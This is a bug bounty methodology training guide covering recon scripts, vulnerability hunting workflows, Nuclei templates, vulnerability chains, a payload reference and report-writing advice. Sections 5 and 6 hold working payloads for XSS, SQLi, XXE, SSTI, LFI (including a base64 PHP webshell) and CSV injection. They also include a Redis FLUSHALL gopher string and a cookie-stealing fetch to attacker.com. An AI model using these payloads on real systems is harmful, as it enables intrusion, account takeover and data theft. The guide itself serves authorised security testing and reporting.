# Bug Bounty Methodology Deep Dive

> CIPHER Training Module | Compiled 2026-03-14
> Sources: 17 repositories, documentation sites, and community knowledge bases

---

## Table of Contents

1. [Recon Automation Pipelines](#1-recon-automation-pipelines)
2. [Vulnerability Discovery Workflows](#2-vulnerability-discovery-workflows)
3. [Nuclei Template Patterns](#3-nuclei-template-patterns)
4. [Common Vulnerability Chains](#4-common-vulnerability-chains)
5. [Vulnerability Class Reference](#5-vulnerability-class-reference)
6. [Report Writing Guidelines](#6-report-writing-guidelines)
7. [Real-World Exploitation Techniques from Writeups](#7-real-world-exploitation-techniques-from-writeups)
8. [Tool Reference](#8-tool-reference)

---

## 1. Recon Automation Pipelines

### 1.1 Full Recon Pipeline Architecture

```
TARGET SCOPE
    |
    v
[Asset Discovery] --> [Subdomain Enumeration] --> [DNS Resolution]
    |                                                    |
    v                                                    v
[Port Scanning] <-- [Live Host Detection] <-- [HTTP Probing]
    |
    v
[Content Discovery] --> [Parameter Discovery] --> [JS Analysis]
    |                          |                       |
    v                          v                       v
[URL Harvesting] --> [Vulnerability Scanning] --> [Manual Testing]
    |
    v
[REPORT]
```

### 1.2 Subdomain Enumeration Pipeline

```bash
#!/bin/bash
# Phase 1: Subdomain enumeration from multiple sources
TARGET="$1"

# Passive enumeration
subfinder -d "$TARGET" -all -silent > subs_subfinder.txt
amass enum -passive -d "$TARGET" -o subs_amass.txt
assetfinder --subs-only "$TARGET" > subs_assetfinder.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u > subs_crt.txt

# Merge and deduplicate
cat subs_*.txt | sort -u > all_subs.txt
echo "[*] Total unique subdomains: $(wc -l < all_subs.txt)"
```

### 1.3 Live Host Detection and HTTP Probing

```bash
# Resolve DNS and check for live hosts
cat all_subs.txt | dnsx -silent -a -resp -o resolved.txt

# HTTP probing with httpx
cat all_subs.txt | httpx -silent -status-code -title -tech-detect \
    -follow-redirects -o live_hosts.txt

# Extract just the live URLs
cat live_hosts.txt | awk '{print $1}' > live_urls.txt
```

### 1.4 URL Harvesting Pipeline

```bash
# Wayback Machine URLs
cat domains.txt | waybackurls > wayback_urls.txt

# Get All URLs (GAU) - queries Wayback, Common Crawl, OTX, URLScan
cat domains.txt | gau --threads 5 --blacklist png,jpg,gif,css,woff,svg,pdf \
    --providers wayback,commoncrawl,otx,urlscan > gau_urls.txt

# ParamSpider - mine parameters from web archives
paramspider -d "$TARGET" -p "FUZZ"
# Output goes to results/<domain>.txt with FUZZ placeholder

# Merge all URLs
cat wayback_urls.txt gau_urls.txt results/*.txt | sort -u > all_urls.txt
```

### 1.5 Parameter Discovery Pipeline

```bash
# Arjun - discover hidden HTTP parameters (25,890+ parameter wordlist)
# Processes in <10 seconds with ~50-60 requests
arjun -u "https://target.com/endpoint" -m GET
arjun -u "https://target.com/api" -m POST --json
arjun -i targets.txt -o params.json --output-format json

# ParamSpider with custom payloads for reflection testing
paramspider -d target.com -p '"><h1>reflection</h1>'

# Filter URLs for interesting parameters using gf patterns
cat all_urls.txt | gf xss > potential_xss.txt
cat all_urls.txt | gf sqli > potential_sqli.txt
cat all_urls.txt | gf ssrf > potential_ssrf.txt
cat all_urls.txt | gf redirect > potential_redirects.txt
cat all_urls.txt | gf lfi > potential_lfi.txt
cat all_urls.txt | gf debug-pages > debug_pages.txt
```

### 1.6 API Endpoint Discovery with Kiterunner

```bash
# Kiterunner - context-aware API endpoint bruteforcing
# Unlike traditional directory bruting, sends properly formatted requests
# matching each API's expected methods, headers, and parameters

# Scan with compiled Swagger-based wordlist
kr scan https://target.com:8443/ -w routes-large.kite

# Scan with Assetnote wordlists (limit to first 20k entries)
kr scan targets.txt -w routes.kite -A=apiroutes-210228:20000

# Traditional brute force mode with extensions
kr brute https://target.com -A=raft-large-words -x 10 -e json,txt,xml

# Performance tuning (start conservative, scale up)
kr scan targets.txt -w routes.kite -x 5 -j 100

# Replay a discovered request through Burp proxy
kr kb replay -w routes.kite "GET 200 [size] /api/v1/users"
```

### 1.7 JavaScript Analysis Pipeline

```bash
# Extract JS files from gathered URLs
cat all_urls.txt | grep -iE "\.js$" | sort -u > js_files.txt

# Download and analyze JS files for secrets/endpoints
cat js_files.txt | while read url; do
    curl -s "$url" | js-beautify
done > all_js_beautified.txt

# Extract endpoints from JS
cat all_js_beautified.txt | grep -oP '["'"'"'](/[a-zA-Z0-9_/\-\.]+)["'"'"']' | sort -u > js_endpoints.txt

# Search for sensitive data in JS
cat all_js_beautified.txt | gf base64
cat all_js_beautified.txt | grep -iE "(api_key|apikey|secret|token|password|aws_)" > js_secrets.txt
```

### 1.8 Content Discovery

```bash
# Feroxbuster for recursive directory discovery
feroxbuster -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,asp,aspx,jsp,html,js,json -t 50 --smart --auto-tune

# ffuf for fuzzing
ffuf -u "https://target.com/FUZZ" -w wordlist.txt -mc 200,301,302,403 \
    -fs 0 -t 50 -o output.json -of json

# Technology-specific wordlists
# WordPress
ffuf -u "https://target.com/FUZZ" -w wp-content-wordlist.txt
# API versioning
ffuf -u "https://target.com/api/FUZZ" -w api-wordlist.txt
```

### 1.9 Complete One-Shot Recon Script

```bash
#!/bin/bash
# one-shot-recon.sh - Full automated recon pipeline
set -euo pipefail

TARGET="$1"
OUTDIR="recon/$TARGET/$(date +%Y%m%d)"
mkdir -p "$OUTDIR"

echo "[PHASE 1] Subdomain enumeration"
subfinder -d "$TARGET" -all -silent | sort -u > "$OUTDIR/subs.txt"

echo "[PHASE 2] HTTP probing"
cat "$OUTDIR/subs.txt" | httpx -silent -status-code -title -tech-detect \
    -follow-redirects > "$OUTDIR/live.txt"
cat "$OUTDIR/live.txt" | awk '{print $1}' > "$OUTDIR/live_urls.txt"

echo "[PHASE 3] URL harvesting"
cat "$OUTDIR/subs.txt" | waybackurls > "$OUTDIR/wayback.txt"
gau "$TARGET" --subs --threads 5 --blacklist png,jpg,gif,css,svg,woff,pdf \
    > "$OUTDIR/gau.txt"
cat "$OUTDIR/wayback.txt" "$OUTDIR/gau.txt" | sort -u > "$OUTDIR/all_urls.txt"

echo "[PHASE 4] Parameter mining"
paramspider -d "$TARGET" 2>/dev/null
cat results/"$TARGET".txt >> "$OUTDIR/all_urls.txt" 2>/dev/null || true

echo "[PHASE 5] Pattern matching for vuln classes"
for pattern in xss sqli ssrf redirect lfi rce idor ssti; do
    cat "$OUTDIR/all_urls.txt" | gf "$pattern" 2>/dev/null | sort -u > "$OUTDIR/gf_${pattern}.txt"
done

echo "[PHASE 6] Nuclei scanning"
nuclei -l "$OUTDIR/live_urls.txt" -severity critical,high,medium \
    -o "$OUTDIR/nuclei_results.txt" -stats -silent

echo "[PHASE 7] Port scanning"
cat "$OUTDIR/subs.txt" | naabu -silent -top-ports 1000 > "$OUTDIR/ports.txt"

echo "[COMPLETE] Results in $OUTDIR"
find "$OUTDIR" -type f -name "*.txt" -exec sh -c 'echo "  $(wc -l < "$1") $1"' _ {} \;
```

---

## 2. Vulnerability Discovery Workflows

### 2.1 Systematic Testing Methodology

```
For each live target:
  1. Technology fingerprinting (Wappalyzer, httpx --tech-detect)
  2. CMS-specific checks (WPScan, CMSmap, Joomscan)
  3. Default credential testing
  4. Authentication mechanism analysis
  5. Authorization testing (IDOR, privilege escalation)
  6. Input validation testing (all injection classes)
  7. Business logic testing
  8. File upload testing
  9. API endpoint testing
  10. Rate limiting and race condition testing
```

### 2.2 Vulnerability-Specific Hunting Workflows

#### XSS Hunting Workflow
```
1. Identify all reflection points:
   - URL parameters → reflected in page
   - Form inputs → stored in database
   - HTTP headers (User-Agent, Referer) → logged/displayed
   - File upload names → rendered in UI

2. Test reflection context:
   - HTML body → <script>alert(1)</script>
   - HTML attribute → " onmouseover="alert(1)
   - JavaScript string → '-alert(1)-'
   - URL context → javascript:alert(1)

3. WAF bypass progression:
   - Basic payload blocked → try encoding
   - Standard tags blocked → try event handlers
   - Event handlers blocked → try SVG/MathML
   - All inline blocked → try DOM-based vectors

4. Escalation:
   - Reflected XSS → steal session tokens
   - Stored XSS → target admin panels
   - DOM XSS → chain with other vulns
```

#### SSRF Hunting Workflow
```
1. Identify URL input points:
   - URL parameters (url=, redirect=, link=, src=, dest=)
   - File imports (from URL)
   - Webhook configurations
   - PDF/image generators
   - API integrations

2. Test internal access:
   - http://127.0.0.1
   - http://localhost
   - http://[::1]
   - http://169.254.169.254 (cloud metadata)
   - http://0x7f000001

3. Bypass filters:
   - DNS rebinding
   - URL encoding
   - Alternative IP formats (decimal, hex, octal)
   - Open redirect chains → SSRF
   - Protocol smuggling (gopher://, dict://)

4. Escalation:
   - Read cloud metadata (AWS/GCP/Azure keys)
   - Port scan internal network
   - Access internal services (databases, admin panels)
   - Chain with RCE via internal services
```

#### IDOR Hunting Workflow
```
1. Map all object references:
   - User IDs in URLs/API calls
   - File/document IDs
   - Order/transaction numbers
   - API resource identifiers

2. Test access controls:
   - Horizontal: access other users' resources (change user_id)
   - Vertical: access admin resources with regular user
   - Sequential: enumerate via incrementing IDs
   - Predictable: UUIDs that aren't truly random

3. Test different HTTP methods:
   - GET /api/users/123 → 403
   - PUT /api/users/123 → 200 (method-based bypass)

4. Parameter manipulation:
   - Change ID in body vs URL
   - Add/modify JSON properties (mass assignment)
   - Test with different content types

5. Escalation:
   - PII disclosure → GDPR violation
   - Financial data access
   - Account takeover via password reset IDOR
   - Admin function access
```

#### SQL Injection Hunting Workflow
```
1. Identify injection points:
   - Search fields, login forms, URL parameters
   - HTTP headers (Cookie, X-Forwarded-For)
   - JSON/XML body parameters
   - Order-by clauses, column names

2. Detection:
   - Single quote: ' → error
   - Boolean: AND 1=1 vs AND 1=2
   - Time-based: AND SLEEP(5)
   - UNION-based: ORDER BY [increment until error]

3. Bypass WAF:
   - Case variation: SeLeCt
   - Comment injection: SEL/**/ECT
   - Encoding: %27 (URL), char() (SQL)
   - Alternative functions: BENCHMARK vs SLEEP

4. Escalation:
   - Data exfiltration (UNION SELECT)
   - Authentication bypass (admin' OR '1'='1)
   - File read (LOAD_FILE)
   - RCE (INTO OUTFILE, xp_cmdshell)
```

#### Authentication Bypass Workflow
```
1. Password reset flow:
   - Token predictability
   - Token reuse after password change
   - Host header injection in reset email
   - Rate limiting on reset endpoint

2. 2FA bypass:
   - Response manipulation (change "success":false to true)
   - Direct navigation to post-2FA pages
   - Token brute force (4-6 digit codes)
   - Backup code abuse
   - OAuth flow bypass

3. Session management:
   - Session fixation
   - Token in URL (referer leakage)
   - Concurrent session handling
   - Logout invalidation testing

4. OAuth/SAML:
   - Open redirect in OAuth callback
   - State parameter absence/reuse
   - Token leakage via referer
   - SAML signature bypass
```

#### Race Condition Hunting Workflow
```
1. Identify stateful operations:
   - Coupon/promo code redemption
   - Money transfer/withdrawal
   - Vote/like mechanisms
   - Invitation acceptance
   - File upload processing

2. Testing:
   - Send parallel requests (Turbo Intruder, curl parallel)
   - Vary timing windows
   - Test idempotency of operations

3. Tools:
   - Burp Turbo Intruder
   - race-the-web
   - Custom threading scripts
```

### 2.3 Technology-Specific Checklists

#### WordPress
```
- WPScan: wpscan --url target --enumerate ap,at,u,vp,vt
- Check /wp-json/wp/v2/users for user enumeration
- Test xmlrpc.php for brute force amplification
- Check debug.log exposure
- Test plugin/theme vulnerabilities (largest attack surface)
```

#### GraphQL
```
- Introspection query: {__schema{types{name,fields{name}}}}
- Batch query attacks
- Authorization bypass via nested queries
- DoS via deeply nested queries
- Field suggestion enumeration
```

#### JWT
```
- Algorithm confusion (RS256 → HS256)
- None algorithm bypass
- Key brute forcing (weak secrets)
- JKU/X5U header injection
- Kid parameter injection (directory traversal, SQLi)
```

#### Jira
```
- Unauthenticated access to dashboards
- User enumeration via /rest/api/2/user/picker
- SSRF via /plugins/servlet/oauth/users/icon-uri
- Information disclosure via /secure/QueryComponent!Default.jspa
```

---

## 3. Nuclei Template Patterns

### 3.1 Template Repository Statistics

| Category | Template Count |
|----------|---------------|
| HTTP | 9,281 |
| Cloud | 659 |
| File | 436 |
| Network | 259 |
| Code | 251 |
| DAST | 240 |
| Workflows | 205 |
| JavaScript | 92 |
| SSL | 38 |
| DNS | 23 |
| **Total** | **~11,997** |

- CVE coverage: 3,587 templates
- Known Exploited Vulnerabilities (KEV): 1,496 templates
- Critical severity: 1,555 templates
- High severity: 2,552 templates
- Info severity: 4,353 templates

### 3.2 Basic Template Structure

```yaml
id: example-detection

info:
  name: Example Vulnerability Detection
  author: researcher
  severity: high
  description: Detects example vulnerability in target application
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-XXXX
  tags: cve,cve2024,rce,example
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78

http:
  - method: GET
    path:
      - "{{BaseURL}}/vulnerable/endpoint"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "vulnerable_indicator"
        part: body
    extractors:
      - type: regex
        regex:
          - "version=([0-9.]+)"
        group: 1
```

### 3.3 HTTP Request Template with Multiple Matchers

```yaml
id: sensitive-file-disclosure

info:
  name: Sensitive File Disclosure
  author: researcher
  severity: medium
  tags: exposure,config

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/config.yml"
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/wp-config.php.bak"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "DB_PASSWORD"
          - "api_key"
          - "aws_secret"
        condition: or
      - type: word
        words:
          - "text/html"
        part: header
        negative: true
```

### 3.4 POST Request with Body and Headers

```yaml
id: api-auth-bypass

info:
  name: API Authentication Bypass
  author: researcher
  severity: critical
  tags: auth,bypass,api

http:
  - raw:
      - |
        POST /api/v1/admin/users HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}

        {"role": "admin", "action": "list"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"users"'
          - '"email"'
        condition: and
```

### 3.5 Multi-Step Template (Chained Requests)

```yaml
id: csrf-token-bypass

info:
  name: CSRF Token Validation Bypass
  author: researcher
  severity: high
  tags: csrf,bypass

http:
  - raw:
      - |
        GET /profile HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /profile/update HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        name=test&csrf_token=invalid_token

    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "updated successfully")'
        condition: and
```

### 3.6 DNS Template

```yaml
id: subdomain-takeover-cname

info:
  name: Subdomain Takeover via Dangling CNAME
  author: researcher
  severity: high
  tags: takeover,dns

dns:
  - name: "{{FQDN}}"
    type: CNAME
    matchers:
      - type: word
        words:
          - "amazonaws.com"
          - "azure-api.net"
          - "cloudfront.net"
          - "herokuapp.com"
          - "ghost.io"
          - "github.io"
          - "shopify.com"
```

### 3.7 DAST/Fuzzing Template

```yaml
id: reflected-xss-fuzz

info:
  name: Reflected XSS Detection
  author: researcher
  severity: medium
  tags: xss,dast

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      xss:
        - '<script>alert(1)</script>'
        - '"><img src=x onerror=alert(1)>'
        - "javascript:alert(1)"
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{xss}}"
    matchers:
      - type: word
        part: body
        words:
          - "{{xss}}"
```

### 3.8 Workflow Template (Conditional Scanning)

```yaml
id: wordpress-workflow

info:
  name: WordPress Security Audit
  author: researcher
  severity: info
  tags: workflow,wordpress

workflows:
  - template: technologies/wordpress-detect.yaml
    subtemplates:
      - tags: wordpress,cve
      - template: vulnerabilities/wordpress/wp-xmlrpc-brute.yaml
      - template: vulnerabilities/wordpress/wp-user-enum.yaml
      - template: exposures/configs/wp-config-backup.yaml
```

### 3.9 Nuclei Scanning Commands

```bash
# Scan single target with all templates
nuclei -u https://target.com

# Scan by severity
nuclei -u https://target.com -s critical,high

# Scan with specific tags
nuclei -l urls.txt -tags cve,rce,sqli,xss

# Scan with rate limiting
nuclei -l urls.txt -rl 100 -c 25 -bs 25

# DAST/fuzzing mode
nuclei -l urls.txt -dast

# Export results
nuclei -l urls.txt -j -o results.jsonl                    # JSONL
nuclei -l urls.txt -me reports/ -severity critical,high    # Markdown
nuclei -l urls.txt -se results.sarif                       # SARIF for CI/CD

# Custom templates
nuclei -u https://target.com -t ~/custom-templates/

# Exclude templates
nuclei -l urls.txt -exclude-tags dos,fuzz

# Update templates
nuclei -update-templates
```

### 3.10 Nuclei + ParamSpider Pipeline

```bash
# Mine parameters then scan with Nuclei
paramspider -d target.com -p "FUZZ"
# ParamSpider outputs URLs with FUZZ placeholder
# Feed directly to Nuclei DAST templates
nuclei -l results/target.com.txt -dast -tags xss,sqli,ssrf
```

---

## 4. Common Vulnerability Chains

### 4.1 Open Redirect to Account Takeover

```
1. Find open redirect: https://target.com/login?redirect=https://evil.com
2. Craft OAuth flow with redirect to attacker domain
3. Victim clicks link, authenticates, token sent to attacker
4. Attacker uses token to access victim's account

Impact: Complete account takeover
Severity escalation: Low (open redirect) → Critical (ATO)
```

### 4.2 SSRF to RCE via Cloud Metadata

```
1. Find SSRF in image fetcher/webhook/URL import
2. Access cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Extract AWS access key, secret key, session token
4. Use credentials to access S3, EC2, Lambda
5. If EC2 role has admin privileges → full cloud compromise

Impact: Cloud infrastructure takeover
ATT&CK: T1552.005 (Cloud Instance Metadata API)
```

### 4.3 XSS to RCE (Electron Apps)

```
1. Find stored XSS in web application
2. Target is an Electron desktop client
3. XSS payload: require('child_process').exec('calc.exe')
4. When admin views the XSS, code executes on their machine

Impact: Remote code execution on client machines
```

### 4.4 CSRF to RCE (WordPress)

```
1. Find CSRF in WordPress plugin settings
2. Craft page that auto-submits form to enable file upload
3. Upload PHP webshell through the plugin
4. Execute commands via webshell

Impact: Full server compromise
```

### 4.5 IDOR + CSRF = Mass Account Takeover

```
1. Find IDOR in email change endpoint (no auth check on user_id)
2. Find missing CSRF token on same endpoint
3. Craft page: auto-changes any user's email to attacker's
4. Trigger password reset on attacker's email
5. Access any user's account

Impact: Mass account takeover
```

### 4.6 Host Header Injection to Account Takeover

```
1. Password reset sends link using Host header value
2. Attacker modifies Host header to evil.com
3. Victim receives reset link pointing to evil.com
4. Victim clicks link, reset token sent to attacker's server
5. Attacker uses token on real site

Impact: Account takeover via poisoned reset links
```

### 4.7 Race Condition in Financial Operations

```
1. User has $100 balance
2. Send 10 simultaneous withdrawal requests for $100
3. Application checks balance before deducting
4. All 10 requests pass the check before any deduction occurs
5. User withdraws $1000 from $100 balance

Impact: Financial loss, business logic bypass
```

### 4.8 Subdomain Takeover Chain

```
1. Enumerate subdomains → find staging.target.com
2. CNAME points to unregistered-app.herokuapp.com
3. Register the Heroku app name
4. Host phishing page or malicious content
5. Valid SSL certificate via target's domain
6. Use for credential harvesting or cookie stealing (same-origin)

Impact: Phishing with valid domain, potential cookie theft
ATT&CK: T1584.001 (Compromise Infrastructure: Domains)
```

### 4.9 SQL Injection Escalation Chain

```
1. Blind SQLi in search parameter
2. Extract database schema → find users table
3. Dump admin credentials (hashed)
4. Crack hash or find password reset token in DB
5. Access admin panel
6. Find file upload in admin → upload webshell
7. RCE on server

Impact: Full server compromise from search box
```

### 4.10 Parameter Pollution + IDOR

```
1. Request: /api/transfer?from=attacker&to=victim&amount=100
2. Add duplicate parameter: ?from=attacker&from=victim&to=attacker&amount=100
3. Backend uses last value of 'from' (victim)
4. Transfer executes from victim's account to attacker

Impact: Financial fraud via parameter handling inconsistency
```

---

## 5. Vulnerability Class Reference

### 5.1 Cross-Site Scripting (XSS)

**Types:**
- Reflected: payload in URL parameter, reflected in response
- Stored: payload persisted in database, rendered to other users
- DOM-based: payload processed by client-side JavaScript
- Blind: payload stored and triggered in different context (e.g., admin panel)

**Common vectors:**
```
<script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
'autofocus onfocus=alert(1)//
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
javascript:alert(1)
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

**WAF bypass techniques:**
- Case mixing: `<ScRiPt>`
- Tag mutation: `<img/src=x onerror=alert(1)>`
- Encoding: HTML entities, URL encoding, Unicode
- Less common tags: `<details>`, `<math>`, `<svg>`
- Event handlers: `onpointerover`, `onanimationend`

**Escalation paths:**
- Session hijacking
- Keylogging
- Phishing (same-origin credibility)
- Cryptocurrency mining
- Worm propagation (stored XSS)
- Chain to RCE in Electron apps

### 5.2 Server-Side Request Forgery (SSRF)

**Common injection points:**
- URL parameters, webhook URLs, file import from URL
- PDF generators, image processors
- API integrations, OAuth callbacks

**Payloads:**
```
# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/           # AWS
http://metadata.google.internal/computeMetadata/v1/ # GCP
http://169.254.169.254/metadata/instance            # Azure

# Bypass techniques
http://0x7f000001/                  # Hex IP
http://0177.0.0.1/                  # Octal IP
http://2130706433/                  # Decimal IP
http://127.1/                       # Short form
http://[::1]/                       # IPv6 loopback
http://spoofed.burpcollaborator.net # DNS rebinding
http://target.com@evil.com          # URL parsing confusion

# Protocol smuggling
gopher://internal:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a  # Redis
dict://internal:11211/stats                                # Memcached
```

### 5.3 SQL Injection

**Detection:**
```
' OR '1'='1                    # Basic boolean
' AND SLEEP(5)--               # Time-based blind
' UNION SELECT NULL--          # UNION-based
' AND 1=CONVERT(int,(SELECT @@version))--  # Error-based
```

**Bypass techniques:**
```
# WAF bypass
/*!50000SELECT*/ @@version     # MySQL version comment
SEL/**/ECT                     # Inline comment
0x756E696F6E                   # Hex encoding of 'union'
CHAR(83,69,76,69,67,84)       # CHAR encoding
```

### 5.4 XML External Entity (XXE)

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- Blind XXE via OOB -->
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

### 5.5 Server-Side Template Injection (SSTI)

```
# Detection polyglot
${{<%[%'"}}%\.

# Jinja2 (Python)
{{7*7}}                              → 49
{{config.items()}}                   → config dump
{{''.__class__.__mro__[1].__subclasses__()}}  → RCE chain

# Twig (PHP)
{{7*7}}                              → 49
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}        → RCE

# Freemarker (Java)
${7*7}                               → 49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= 7*7 %>                           → 49
<%= system("id") %>                  → RCE
```

### 5.6 CRLF Injection

```
# Header injection
%0d%0aInjected-Header:value
%0d%0a%0d%0a<script>alert(1)</script>

# Log injection
username%0d%0a[SUCCESS] admin logged in

# HTTP response splitting
%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a...
```

### 5.7 Local File Inclusion (LFI)

```
# Basic traversal
../../../../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://input (with POST body containing PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log poisoning → RCE
1. Inject PHP in User-Agent → access log
2. Include /var/log/apache2/access.log
```

### 5.8 CSV Injection

```
=CMD|'/C calc.exe'!A1
@SUM(1+1)*cmd|' /C calc'!A0
+cmd|'/C calc.exe'!A0
-cmd|'/C calc.exe'!A0
```

### 5.9 Open Redirect

```
# Common parameters
?url=https://evil.com
?redirect=https://evil.com
?next=https://evil.com
?return=https://evil.com
?dest=https://evil.com
?rurl=https://evil.com

# Bypass techniques
//evil.com                    # Protocol-relative
/\/evil.com                   # Path confusion
target.com.evil.com           # Subdomain trick
target.com@evil.com           # URL userinfo
%0d%0aLocation: https://evil.com  # Header injection
//evil%00.com                 # Null byte
https://evil.com%23.target.com    # Fragment
```

### 5.10 Insecure Direct Object Reference (IDOR)

**Testing methodology:**
```
1. Create two accounts (A and B)
2. Perform actions as A, capture all requests with object IDs
3. Replay requests substituting B's object IDs
4. Check if A can access/modify B's resources

Common locations:
- /api/users/{id}/profile
- /api/orders/{id}
- /api/documents/{id}/download
- /api/messages/{id}
- GraphQL: query { user(id: "OTHER_ID") { email } }
```

---

## 6. Report Writing Guidelines

### 6.1 Report Structure

```
TITLE: [Vulnerability Type] in [Component] allows [Impact]

SEVERITY: Critical/High/Medium/Low
CVSS: [Score] ([Vector String])

SUMMARY:
One paragraph describing what was found, where, and why it matters.

STEPS TO REPRODUCE:
1. Navigate to [URL]
2. Intercept request with proxy
3. Modify parameter X to value Y
4. Observe [outcome]

IMPACT:
- What can an attacker do?
- Who is affected?
- What data is at risk?
- Business impact in concrete terms

PROOF OF CONCEPT:
[Screenshots, HTTP requests/responses, video]

REMEDIATION:
Specific fix recommendations with code examples where applicable.

REFERENCES:
- CWE-XXX
- OWASP reference
- Similar CVEs
```

### 6.2 Report Quality Checklist

```
[ ] Clear, descriptive title (not just "XSS found")
[ ] Accurate severity rating with CVSS justification
[ ] Step-by-step reproduction (anyone can follow)
[ ] Minimal reproduction (no unnecessary steps)
[ ] Impact statement in business terms
[ ] PoC that proves impact without causing damage
[ ] Screenshots/video at each step
[ ] Tested on latest version
[ ] Remediation is actionable and specific
[ ] No condescending tone
[ ] Checked for duplicates before submitting
```

### 6.3 Severity Assessment Guide

```
CRITICAL (CVSS 9.0-10.0):
- Unauthenticated RCE
- Full database dump (SQLi)
- Authentication bypass to admin
- Cloud credential theft (SSRF → metadata)
- Mass account takeover

HIGH (CVSS 7.0-8.9):
- Stored XSS in widely-used feature
- SSRF to internal network
- Privilege escalation (user → admin)
- IDOR exposing PII at scale
- Authentication bypass

MEDIUM (CVSS 4.0-6.9):
- Reflected XSS requiring interaction
- CSRF on sensitive actions
- Information disclosure (stack traces, configs)
- Rate limiting bypass on auth endpoints
- Open redirect (standalone)

LOW (CVSS 0.1-3.9):
- Self-XSS
- CSRF on non-sensitive actions
- Missing security headers
- Verbose error messages
- Username enumeration

INFORMATIONAL:
- Missing best practices
- Version disclosure
- Minor misconfigurations
```

### 6.4 Common Report Mistakes

```
AVOID:
- "This allows an attacker to do bad things" → Specify WHAT bad things
- Submitting without reproduction steps
- Overstating severity (reflected self-XSS as Critical)
- Submitting scanner output without verification
- Multiple vulnerabilities in one report
- Not checking scope before reporting
- Submitting duplicates of known issues
- Automated scan dumps with no manual validation

DO:
- Show real impact with minimal PoC
- Use attacker-victim narrative
- Provide HTTP requests/responses, not just screenshots
- Include remediation with code examples
- Reference similar accepted reports for severity precedent
```

### 6.5 Example High-Quality Report

```
TITLE: Stored XSS in User Profile Bio Leads to Admin Account Takeover

SEVERITY: High (CVSS 8.1 - AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N)

SUMMARY:
The user profile biography field on app.target.com does not sanitize
HTML input. An authenticated attacker can inject JavaScript that executes
when any user (including administrators) views the attacker's profile.
This can be leveraged to steal admin session tokens.

STEPS TO REPRODUCE:
1. Log in to https://app.target.com with any user account
2. Navigate to Settings → Profile
3. In the "Bio" field, enter:
   <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
4. Save profile
5. When any user visits the attacker's profile page, their cookies
   are sent to attacker.com

HTTP REQUEST (Step 4):
POST /api/v1/profile HTTP/1.1
Host: app.target.com
Content-Type: application/json
Cookie: session=abc123

{"bio":"<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">"}

RESPONSE:
HTTP/1.1 200 OK
{"status":"success","message":"Profile updated"}

IMPACT:
- Attacker steals admin session tokens → full admin access
- Can modify any user's data, access billing information
- Potential for worm: XSS modifies other profiles automatically
- Affects all users who view the malicious profile

REMEDIATION:
1. Sanitize all user input server-side using a library like DOMPurify
2. Implement Content-Security-Policy header to prevent inline script execution
3. Set HttpOnly flag on session cookies to prevent JavaScript access
4. Consider implementing CSP nonce-based script allowlisting

REFERENCES:
- CWE-79: Improper Neutralization of Input During Web Page Generation
- OWASP XSS Prevention Cheat Sheet
```

---

## 7. Real-World Exploitation Techniques from Writeups

### 7.1 Notable Bug Bounty Patterns (from Awesome-Bugbounty-Writeups)

**XSS Escalation Patterns:**
- Reflected XSS on Microsoft subdomains — often found in legacy applications
- Stored XSS in Google Nest — IoT admin interfaces rarely sanitize
- DOM-based XSS on iCloud.com — client-side frameworks with improper sanitization
- Blind XSS in admin panels — payload fires days later when admin reviews input
- XSS via file upload names — filename rendered unsanitized in file manager UI

**SSRF Real-World Targets:**
- Image rendering services (PhantomJS, wkhtmltopdf) — inject URLs in HTML content
- Webhook configurations — user-supplied URLs fetched server-side
- PDF generators — embed SSRF payloads in HTML → PDF conversion
- OAuth/SSO integrations — redirect_uri manipulated to internal endpoints

**Authentication Bypass Patterns:**
- 2FA bypass via response manipulation — intercept and modify server response
- OAuth token leakage via open redirect in callback URL
- Password reset token in URL → referer header leaks token to third parties
- SAML signature verification bypass — XML comment injection

**Race Condition Wins:**
- Coupon code reuse — apply discount code multiple times in parallel
- Follow/unfollow race — inflate follower count
- Transaction races — double-spend via concurrent API calls

